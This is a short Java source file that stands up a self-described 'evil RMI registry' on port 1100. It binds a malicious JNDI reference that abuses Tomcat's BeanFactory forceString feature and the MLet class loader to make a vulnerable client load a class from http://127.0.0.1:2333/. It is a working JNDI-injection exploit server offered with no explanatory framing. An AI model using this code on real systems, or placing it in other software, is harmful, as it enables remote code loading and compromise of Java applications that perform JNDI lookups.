package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class MletServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1100");
        Registry registry = LocateRegistry.createRegistry(1100);
        System.setProperty("java.rmi.server.hostname", "127.0.0.1");
        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
        ref.add(new StringRefAddr("a","java.lang.Runtime"));
        ref.add(new StringRefAddr("b","http://127.0.0.1:2333/"));
        ref.add(new StringRefAddr("c","Bitterz"));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("melt", referenceWrapper);
    }
}
